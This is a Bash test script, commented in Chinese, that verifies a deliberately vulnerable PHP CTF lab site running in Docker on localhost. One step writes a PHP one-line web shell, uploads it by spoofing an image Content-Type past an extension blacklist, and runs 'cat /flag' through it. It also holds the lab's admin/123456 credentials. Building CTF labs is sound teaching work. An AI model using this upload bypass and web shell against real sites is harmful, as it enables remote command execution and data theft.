#!/bin/bash
# ============================================================
# CTF 大作业自动化验证脚本
# 运行环境：Git Bash (Windows) / Linux 通用
# 用法：bash scripts/verify.sh
# 输出：reports/verify.log
# ============================================================
set -u
cd "$(dirname "$0")/.."

# ---------- Docker CLI 定位（Windows：优先使用项目内置 CLI） ----------
export DOCKER_HOST="${DOCKER_HOST:-npipe:////./pipe/docker_engine}"
if command -v docker >/dev/null 2>&1; then
    DOCKER="docker"
elif [ -x ".tools/docker/docker.exe" ]; then
    DOCKER=".tools/docker/docker.exe"
else
    DOCKER="docker"
fi
if command -v docker-compose >/dev/null 2>&1; then
    COMPOSE="docker-compose"
elif [ -x ".tools/docker-compose.exe" ]; then
    COMPOSE=".tools/docker-compose.exe"
else
    COMPOSE="docker-compose"
fi

BASE="http://127.0.0.1:26112"
FLAG="flag{this_is_zhangchangxin's_bigwork}"
HINT="TODO(dev): avatar upload legacy validation only blocks exe/bat/sh/cmd; php/png/jpg are not filtered and original filename is kept under /uploads/."
LOG="reports/verify.log"
TMP=".verify_tmp"

mkdir -p reports "$TMP"
: > "$LOG"
PASS=0; FAIL=0

log() { printf '%s\n' "$*" | tee -a "$LOG"; }
sec() { log ""; log "========== $1 =========="; }
ok()  { PASS=$((PASS+1)); log "[PASS] $1"; }
no()  { FAIL=$((FAIL+1)); log "[FAIL] $1"; }

# 断言：文件包含指定关键字
expect_contains() {
    if grep -qF -- "$3" "$2" 2>/dev/null; then ok "$1"; else no "$1"; fi
}
# 断言：文件不包含指定关键字
expect_not_contains() {
    if grep -qF -- "$3" "$2" 2>/dev/null; then no "$1"; else ok "$1"; fi
}

# ============================================================
sec "步骤 1：重建并启动 Docker 服务 ($DOCKER / $COMPOSE)"
log "\$ $COMPOSE down -v"
"$COMPOSE" down -v >> "$LOG" 2>&1
log "\$ $COMPOSE build --no-cache"
if "$COMPOSE" build --no-cache >> "$LOG" 2>&1; then
    ok "docker compose build --no-cache 成功"
else
    no "docker compose build --no-cache 失败（详见日志）"
fi
log "\$ $COMPOSE up -d"
if "$COMPOSE" up -d >> "$LOG" 2>&1; then
    ok "docker compose up -d 成功"
else
    no "docker compose up -d 失败（详见日志）"
fi
"$COMPOSE" ps >> "$LOG" 2>&1

# ============================================================
sec "步骤 2：等待服务启动（先等 60 秒，再轮询探测）"
log "sleep 60 ..."
sleep 60
UP=0
for i in $(seq 1 12); do
    CODE=$(curl -s -o /dev/null -w '%{http_code}' --max-time 5 "$BASE/index.php" 2>/dev/null)
    if [ "$CODE" = "200" ]; then UP=1; log "服务在第 $i 轮探测后响应 (HTTP 200)"; break; fi
    sleep 5
done
if [ "$UP" = "1" ]; then ok "服务已启动并可访问 (http://127.0.0.1:26112)"; else no "服务启动超时，首页不可访问"; fi

# ============================================================
sec "步骤 3：首页检查（可访问 / hint / 无 flag 泄露）"
CODE=$(curl -s --max-time 10 -o "$TMP/index.html" -w '%{http_code}' "$BASE/")
if [ "$CODE" = "200" ]; then ok "首页可访问 (HTTP 200)"; else no "首页访问异常 (HTTP $CODE)"; fi
expect_contains "主页源码包含上传漏洞 hint 注释" "$TMP/index.html" "$HINT"
expect_contains "主页为校园二手交易平台页面" "$TMP/index.html" "青苗"
expect_not_contains "主页源码不包含真实 flag" "$TMP/index.html" "$FLAG"

# ============================================================
sec "步骤 4：登录功能检查"
CODE=$(curl -s --max-time 10 -o "$TMP/login_page.html" -w '%{http_code}' "$BASE/login.php")
expect_contains "登录页用户名默认预填 admin" "$TMP/login_page.html" 'value="admin"'

curl -s --max-time 10 -o "$TMP/login_bad.html" -d "username=admin&password=wrongpass" "$BASE/login.php"
expect_contains "错误密码登录被拒绝（提示用户名或密码错误）" "$TMP/login_bad.html" "用户名或密码错误"

CODE=$(curl -s --max-time 10 -c "$TMP/cookies.txt" -o "$TMP/login_ok.html" -w '%{http_code}' -d "username=admin&password=123456" "$BASE/login.php")
if [ "$CODE" = "302" ]; then ok "正确密码 admin/123456 登录成功（302 跳转 dashboard）"; else no "正确密码登录失败 (HTTP $CODE)"; fi

CODE=$(curl -s --max-time 10 -b "$TMP/cookies.txt" -o "$TMP/dashboard.html" -w '%{http_code}' "$BASE/dashboard.php")
if [ "$CODE" = "200" ] && grep -q "个人中心" "$TMP/dashboard.html"; then
    ok "携带 Cookie 访问个人中心成功 (HTTP 200)"
else
    no "携带 Cookie 访问个人中心失败 (HTTP $CODE)"
fi

CODE=$(curl -s -o /dev/null --max-time 10 -w '%{http_code}' "$BASE/dashboard.php")
if [ "$CODE" = "302" ]; then ok "未登录访问个人中心被拦截（302 跳转登录页）"; else no "未登录访问个人中心未被拦截 (HTTP $CODE)"; fi
expect_not_contains "个人中心源码不包含真实 flag" "$TMP/dashboard.html" "$FLAG"

# ============================================================
sec "步骤 5：上传防护检查（.exe 必须被黑名单拦截）"
printf 'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xFF\xFF\x00\x00fake-exe-content' > "$TMP/avatar.exe"
curl -s --max-time 10 -b "$TMP/cookies.txt" \
    -F "avatar=@$TMP/avatar.exe;type=image/png" \
    -o "$TMP/exe_resp.html" "$BASE/upload.php"
expect_contains "伪装 image/png 的 .exe 被扩展名黑名单拦截" "$TMP/exe_resp.html" "禁止上传"
curl -s --max-time 10 -o "$TMP/exe_fetch.txt" "$BASE/uploads/avatar.exe"
expect_not_contains "avatar.exe 未被保存到 /uploads/" "$TMP/exe_fetch.txt" "fake-exe-content"

# ============================================================
sec "步骤 6：上传绕过 + 一句话木马 GetFlag（核心漏洞验证）"
cat > "$TMP/shell.php" <<'PHPEOF'
<?php @system($_GET['cmd']);
PHPEOF
curl -s --max-time 10 -b "$TMP/cookies.txt" \
    -F "avatar=@$TMP/shell.php;type=image/png" \
    -o "$TMP/shell_resp.html" "$BASE/upload.php"
expect_contains "shell.php 伪造 Content-Type: image/png 上传成功" "$TMP/shell_resp.html" "上传成功"
expect_contains "原文件名保留，文件位于 /uploads/shell.php" "$TMP/shell_resp.html" "/uploads/shell.php"

curl -s --max-time 10 -o "$TMP/flag_resp.txt" "$BASE/uploads/shell.php?cmd=cat%20/flag"
expect_contains "一句话木马执行 cat /flag 返回正确 flag" "$TMP/flag_resp.txt" "$FLAG"

# ============================================================
sec "步骤 7：Flag 提交校验页面（hash_equals 服务端比对）"
curl -s --max-time 10 -b "$TMP/cookies.txt" --data-urlencode "flag=flag{this_is_a_wrong_flag}" \
    -o "$TMP/flag_bad.html" "$BASE/flag_submit.php"
expect_contains "错误 flag 提交被拒绝" "$TMP/flag_bad.html" "不正确"

curl -s --max-time 10 -b "$TMP/cookies.txt" --data-urlencode "flag=$FLAG" \
    -o "$TMP/flag_ok.html" "$BASE/flag_submit.php"
expect_contains "正确 flag 提交校验成功" "$TMP/flag_ok.html" "恭喜你完成挑战"
expect_not_contains "flag_submit 页面源码不包含真实 flag" "$TMP/flag_ok.html" "$FLAG"

# ============================================================
sec "步骤 8：全站源码 flag 泄露检查"
for p in "/" "/login.php" "/flag_submit.php"; do
    curl -s --max-time 10 -o "$TMP/leak.html" "$BASE$p"
    expect_not_contains "源码泄露检查 $p 不含真实 flag" "$TMP/leak.html" "$FLAG"
done
LEAK=$(curl -s --max-time 10 -b "$TMP/cookies.txt" "$BASE/dashboard.php" | grep -cF "$FLAG" || true)
if [ "${LEAK:-0}" = "0" ]; then ok "源码泄露检查 /dashboard.php 不含真实 flag"; else no "源码泄露检查 /dashboard.php 含真实 flag"; fi
# /flag 文件在容器内且不在 Web 根目录
if "$COMPOSE" exec -T web sh -c 'test -f /flag && test ! -f /var/www/html/flag && echo FLAG_OK' >> "$LOG" 2>&1; then
    ok "/flag 位于容器根目录且不在 Web 根目录内"
else
    no "/flag 位置检查失败"
fi

# ============================================================
sec "步骤 9：本机 IP 访问 26112 端口检查"
IPS=""
if command -v powershell.exe >/dev/null 2>&1; then
    IPS=$(powershell.exe -NoProfile -Command "Get-NetIPAddress -AddressFamily IPv4 | Select-Object -ExpandProperty IPAddress" 2>/dev/null | tr -d '\r' | grep -v '^127\.' | sort -u)
fi
if [ -z "$IPS" ] && command -v hostname >/dev/null 2>&1; then
    IPS=$(hostname -I 2>/dev/null)
fi
IP_OK=""
for ip in $IPS; do
    log "尝试 http://$ip:26112/ ..."
    CODE=$(curl -s -o /dev/null --max-time 5 -w '%{http_code}' "http://$ip:26112/" 2>/dev/null)
    log "  -> HTTP $CODE"
    if [ "$CODE" = "200" ]; then IP_OK="$ip"; break; fi
done
if [ -n "$IP_OK" ]; then ok "本机 IP ($IP_OK) 访问 26112 端口成功"; else no "所有本机 IP 均无法访问 26112 端口"; fi

# ============================================================
sec "步骤 10：最终服务状态"
"$COMPOSE" ps >> "$LOG" 2>&1

# 清理临时目录
rm -rf "$TMP"

log ""
log "=============================================="
log "验证完成：PASS=$PASS FAIL=$FAIL"
if [ "$FAIL" -eq 0 ]; then
    log "结论：全部验证通过 ✔"
else
    log "结论：存在失败项，请检查上方 [FAIL] 条目"
fi
log "=============================================="

[ "$FAIL" -eq 0 ] && exit 0 || exit 1
